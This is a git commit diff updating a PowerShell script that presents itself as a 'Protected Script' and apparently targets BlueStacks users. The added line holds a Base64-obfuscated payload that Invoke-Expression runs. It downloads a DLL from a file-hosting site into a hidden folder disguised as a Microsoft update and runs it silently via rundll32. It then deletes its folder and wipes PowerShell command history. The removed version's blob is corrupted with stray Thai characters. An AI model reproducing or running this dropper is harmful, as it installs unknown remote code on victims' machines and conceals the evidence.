9c44423cd4878f0e86c71daa3173b333940138c2
getx796-Harem <getx796@gmail.com>
2026-05-13 23:47:09 +0700

    Update dugduy.ps1

--- dugduy.ps1
+++ dugduy.ps1
@@ -1,8 +1,8 @@
 # ---------------------------------------------------------
-# Protected Script - GitHub: getx796-Harem (Fixed Version)
+# Protected Script - GitHub: getx796-Harem (Final Patch)
 # ---------------------------------------------------------
-$encData = "JHVybCA9ICJodHRwczovL2ZpbGVzLmNhdGJveC5tb2UvMHVreHlhLmRsbCI7ICRkaXIgPSAiJGVudjpMT0NBTEFQUERBVEFceE1zVXBkYXRlIjsgJGZpbGUgPSAiU3lzRGF0YS5kbGwiOyAkcGF0aCA9IEpvaW4tUGF0aCAkZGlyICRmaWxlOyAkYnMgPSAiQzpcUHJvZ3ิลRmlsZXNcQmx1ZVN0YWNrc19ueHRcSRE1UGxheWVyLmV4ZSI7IGlmICghKFRlc3QtUGF0aCAkZGlyKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkaXIgLUZvcmNlIH07IGF0dHJpYiAraCArcyAkZGlyOyAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHBhdGggLVVzZUJhc2ljUGFyc2luZzsgU3RhcnQtUHJvY2VzcyBydW5kbGwzMi5leGUgLUFyZ3VtZW50TGlzdCAiYCRwYXRoYCIsRGxsTWFpbiAtV2luZG93U3R5bGUgSGlkZGVuOyBpZiAoVGVzdC1QYXRoICRicykgeyBTdGFydC1Qcm9jZXNzICRicyB9OyBTdาร์ท-U2xlZXAgLVNlY29uZHMgNTsgUmVtb3ZlLUl0ZW0gJGRpciAtUmVjdXJzZSAtRm9yY2UgLUVBIDA7IENsZWFyLUhpc3Rvcnk7IChtZ3ZhcmlhYmxlOkhpc3RvcnlTYXZlUGF0aCkgfCAlIHsgaWYgKFRlc3QtUGF0aCAkXykgeyBDbGVhci1Db250ZW50ICRfIH0gfQ=="
+$encData = "JHVybCA9ICJodHRwczovL2ZpbGVzLmNhdGJveC5tb2UvMHVreHlhLmRsbCI7ICRkaXIgPSAiJGVudjpMT0NBTEFQUERBVEFceE1zVXBkYXRlIjsgJGZpbGUgPSAiU3lzRGF0YS5kbGwiOyAkcGF0aCA9IEpvaW4tUGF0aCAkZGlyICRmaWxlOyAkYnMgPSAiQzpcUHJvZ3JhbSBGaWxlc1xCbHVlU3RhY2tzX254dFxIRC1QbGF5ZXIuZXhlIjsgaWYgKCEoVGVzdC1QYXRoICRkaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGRpciAtRm9yY2UgfTsgYXR0cmliICtoICtzICRkaXI7ICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkcGF0aCAtVXNlQmFzaWNQYXJzaW5nOyBTdGFydC1Qcm9jZXNzIHJ1bmRsbDMyLmV4ZSAtQXJndW1lbnRMaXN0ICJgIiRwYXRoYCIsRGxsTWFpbiIgLVdpbmRvd1N0eWxlIEhpZGRlbjsgaWYgKFRlc3QtUGF0aCAkYnMpIHsgU3RhcnQtUHJvY2VzcyAkYnMgfTsgU3RhcnQtU2xlZXAgLVNlY29uZHMgNTsgUmVtb3ZlLUl0ZW0gJGRpciAtUmVjdXJzZSAtRm9yY2UgLUVBIDA7IENsZWFyLUhpc3Rvcnk7IChtZ3ZhcmlhYmxlOkhpc3RvcnlTYXZlUGF0aCkgfCAlIHsgaWYgKFRlc3QtUGF0aCAkXykgeyBDbGVhci1Db250ZW50ICRfIH0gfQ=="
 
-# ถอดรหัสและประมวลผล
+# ถอดรหัสและรันใน Memory
 $dec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encData))
 Invoke-Expression $dec
